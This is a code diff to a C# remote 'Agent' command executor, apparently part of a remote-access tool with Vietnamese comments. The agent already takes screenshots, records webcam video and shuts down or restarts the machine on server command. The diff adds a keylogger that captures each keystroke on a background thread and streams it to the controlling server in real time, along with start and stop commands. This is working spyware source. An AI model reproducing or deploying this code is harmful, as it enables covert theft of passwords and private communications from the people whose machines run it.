@@ -1,5 +1,6 @@
 ﻿using Agent.Functions;
 using Shared;
+using System.Text;
 using System.Text.Json;
 using System.Threading;
 
@@ -11,6 +12,8 @@ namespace Agent
         private ApplicationManager _appManager;
         private TaskManager _taskManager;
         private WebcamManager _webcamManager;
+
+        private CancellationTokenSource _keyloggerCts;
 
         public CommandExecutor(IResponseSender responseSender)
         {
@@ -24,17 +27,19 @@ namespace Agent
         {
             if (!Enum.TryParse(command.Name, true, out AgentCommandType commandType))
             {
-                Console.WriteLine($"[EXECUTOR] Lệnh không hợp lệ: {command.Name}");
+                string msg = $"[EXECUTOR] Lệnh không hợp lệ: {command.Name}";
+                Console.WriteLine(msg);
+                await _responseSender.SendStatus(false, msg, CancellationToken.None);
                 return;
             }
 
             switch (commandType)
             {
                 case AgentCommandType.Shutdown:
-                    ExecuteShutdown();
+                    await ExecuteShutdown();
                     break;
                 case AgentCommandType.Restart:
-                    ExecuteRestart();
+                    await ExecuteRestart();
                     break;
                 case AgentCommandType.Screenshot:
                     await ExecuteCapture(cancellationToken);
@@ -66,22 +71,37 @@ namespace Agent
                 case AgentCommandType.WebcamRecord:
                     await ExecuteRecordingWebcam(command.Data, cancellationToken);
                     break;
-
+                case AgentCommandType.Keylogger:
+                    if (_keyloggerCts != null) return;
+                    _keyloggerCts = new CancellationTokenSource();
+                    _ = ExecuteKelogger(_keyloggerCts.Token);
+                    break;
+                case AgentCommandType.StopKeylogger:
+                    Console.WriteLine("[ACTION] Nhận lệnh dừng Keylogger từ Server.");
+                    _keyloggerCts?.Cancel();
+                    _keyloggerCts = null;
+                    break;
                 default:
-                    Console.WriteLine($"[EXECUTOR] Cảnh báo: Lệnh '{commandType}' hiện chưa được hỗ trợ hệ thống.");
+                    string msg = $"[EXECUTOR] Cảnh báo: Lệnh '{commandType}' hiện chưa được hỗ trợ hệ thống.";
+                    Console.WriteLine(msg);
+                    await _responseSender.SendStatus(false, msg, cancellationToken);
                     break;
             }
         }
 
-        private void ExecuteShutdown()
+        private async Task ExecuteShutdown()
         {
-            Console.WriteLine("[SYSTEM] Đang thực hiện lệnh tắt máy...");
+            string msg = "[SYSTEM] Đang thực hiện lệnh tắt máy...";
+            Console.WriteLine(msg);
+            await _responseSender.SendStatus(true, msg, CancellationToken.None);
             Functions.SystemController.Shutdown();
         }
 
-        private void ExecuteRestart()
+        private async Task ExecuteRestart()
         {
-            Console.WriteLine("[SYSTEM] Đang thực hiện lệnh khởi động lại máy...");
+            string msg = "[SYSTEM] Đang thực hiện lệnh khởi động lại máy...";
+            Console.WriteLine(msg);
+            await _responseSender.SendStatus(true, msg, CancellationToken.None);
             Functions.SystemController.Restart();
         }
 
@@ -396,6 +416,50 @@ namespace Agent
                 await _responseSender.SendStatus(false, errorMsg, cancellationToken);
                 Console.WriteLine($"[FATAL] {errorMsg}");
             }
+        }
+
+        public async Task ExecuteKelogger(CancellationToken cancellationToken)
+        {
+            var logger = new Agent.Functions.KeyLogger();
+            var tcs = new TaskCompletionSource<bool>();
+
+            //có phím là gửi về Server ngay
+            logger.OnKeyCaptured = async (keyText) =>
+            {
+                try
+                {
+                    await _responseSender.SendText(keyText, cancellationToken);
+                }
+                catch { }
+            };
+
+            var loggerThread = new Thread(() =>
+            {
+                try
+                {
+                    logger.Start();
+
+                    cancellationToken.Register(() =>
+                    {
+                        logger.Stop();
+                        tcs.TrySetResult(true);
+                    });
+
+                    Application.Run();
+                }
+                catch (Exception ex)
+                {
+                    tcs.TrySetException(ex);
+                }
+            });
+
+            loggerThread.SetApartmentState(ApartmentState.STA);
+            loggerThread.Start();
+
+            await _responseSender.SendStatus(true, "Keylogger started (Real-time mode).", cancellationToken);
+
+            // Task này sẽ chạy vô hạn cho đến khi cancellationToken bị Cancel
+            await tcs.Task;
         }
     }
 }
